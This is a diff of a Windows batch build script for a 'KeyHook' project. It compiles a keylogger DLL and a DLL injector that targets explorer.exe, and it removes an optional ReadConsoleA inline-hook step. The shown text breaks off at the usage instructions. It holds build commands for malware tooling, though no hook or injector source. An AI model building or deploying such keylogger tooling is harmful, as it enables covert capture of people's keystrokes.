@@ -1,11 +1,11 @@
-@REM Build script for KeyHook2 project
+@REM Build script for KeyHook project
 @REM Automatically sets up Visual Studio environment
 @REM Can be run from any command prompt or PowerShell
 @REM Usage: build.bat
 
 @echo off
 echo ========================================
-echo      KeyHook2 Project Build Script
+echo      KeyHook Project Build Script
 echo ========================================
 echo Target Architecture: x64
 echo Target Process: explorer.exe
@@ -82,13 +82,12 @@ REM Define output names with build directory
 set BUILD_DIR=built
 set KEYLOGGER_DLL=%BUILD_DIR%\keylogger.dll
 set INJECTOR_EXE=%BUILD_DIR%\injector.exe
-set INLINE_HOOK_DLL=%BUILD_DIR%\inlinehook.dll
 
 REM Define libraries
 set HOOK_LIBS=user32.lib kernel32.lib
 set INJECTOR_LIBS=user32.lib kernel32.lib
 
-echo [1/3] Compiling Keyboard Hook DLL...
+echo [1/2] Compiling Keyboard Hook DLL...
 echo Command: cl /LD /EHsc /Fe%KEYLOGGER_DLL% keyboardhook.cpp %HOOK_LIBS%
 cl /LD /EHsc /Fe%KEYLOGGER_DLL% keyboardhook.cpp %HOOK_LIBS%
 
@@ -100,27 +99,15 @@ IF %ERRORLEVEL% NEQ 0 (
 )
 
 echo.
-echo [2/3] Compiling DLL Injector...
-echo Command: cl /EHsc /Fe%INJECTOR_EXE% ReadConsoleA-injector.cpp %INJECTOR_LIBS%
-cl /EHsc /Fe%INJECTOR_EXE% ReadConsoleA-injector.cpp %INJECTOR_LIBS%
+echo [2/2] Compiling DLL Injector...
+echo Command: cl /EHsc /Fe%INJECTOR_EXE% injector.cpp %INJECTOR_LIBS%
+cl /EHsc /Fe%INJECTOR_EXE% injector.cpp %INJECTOR_LIBS%
 
 IF %ERRORLEVEL% NEQ 0 (
     echo [ERROR] Injector compilation failed!
     goto :error
 ) ELSE (
     echo [SUCCESS] %INJECTOR_EXE% compiled successfully!
-)
-
-echo.
-echo [3/3] Compiling Inline Hook DLL (optional)...
-echo Command: cl /LD /EHsc /Fe%INLINE_HOOK_DLL% inlinehook.cpp %HOOK_LIBS%
-cl /LD /EHsc /Fe%INLINE_HOOK_DLL% inlinehook.cpp %HOOK_LIBS%
-
-IF %ERRORLEVEL% NEQ 0 (
-    echo [ERROR] Inline Hook DLL compilation failed!
-    goto :error
-) ELSE (
-    echo [SUCCESS] %INLINE_HOOK_DLL% compiled successfully!
 )
 
 echo.
@@ -131,7 +118,6 @@ echo.
 echo Generated files in %BUILD_DIR%\ directory:
 echo   - keylogger.dll       (Main keylogger DLL)
 echo   - injector.exe        (DLL injector tool)
-echo   - inlinehook.dll      (ReadConsoleA hook DLL)
 echo.
 echo Usage Instructions:
 echo   1. Get target process PID: 
